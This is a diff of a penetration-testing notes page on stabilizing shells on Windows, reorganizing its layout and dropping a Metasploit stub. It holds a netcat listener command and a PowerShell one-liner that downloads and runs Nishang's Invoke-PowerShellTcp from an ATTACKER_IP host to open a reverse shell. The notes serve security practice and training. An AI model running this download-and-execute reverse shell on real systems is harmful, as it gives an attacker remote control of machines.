@@ -5,21 +5,23 @@ description: Windows Shell Stabilization
 keywords: [shell stabilization windows, rlwrap, metasploit shell stabilization]
 ---
 
+:::caution Work In Progress
 
-- **In Windows we can use `rlwrap` before connecting to the Target Machine** 
+:::
 
-```bash
+
+
+```batch
+:: In Windows we can use rlwrap before Connecting to the Target Machine
 rlwrap nc -nvlp $PORT
 ```
 
-- **After connecting to the Target we can `Upload - Execute:`** <b style={{ color: 'MediumTurquoise' }}>Invoke-PowerShellTcp [Nishang]</b> 
-- **[An interactive `PowerShell` Reverse Connect]**
-
 ```powershell
+# After connecting to the Target we can Upload - Execute Invoke-PowerShellTcp [Nishang]
+# [An interactive PowerShell Reverse Connect]
 powershell IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:PORT/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress $ATTACKER_IP -Port $PORT
 ```
 
-<br/>
 
 ## Interface
 
@@ -30,11 +32,3 @@ chcp 65001
 :: Set Keyboard Layout
 Set-WinUserLanguageList -LanguageList us-US -force
 ```
-
-<br/>
-
-## Metasploit
-
-:::caution Work In Progress
-
-:::
